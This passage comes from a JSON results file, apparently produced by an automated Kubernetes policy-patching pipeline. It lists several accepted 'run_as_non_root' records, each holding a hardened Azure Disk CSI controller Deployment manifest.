timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "errors": []
  },
  {
    "id": "01150",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "errors": []
  },
  {
    "id": "01151",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "errors": []
  },
  {
    "id": "01152",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "errors": []
  },
  {
    "id": "01153",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "errors": []
  },
  {
    "id": "01154",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        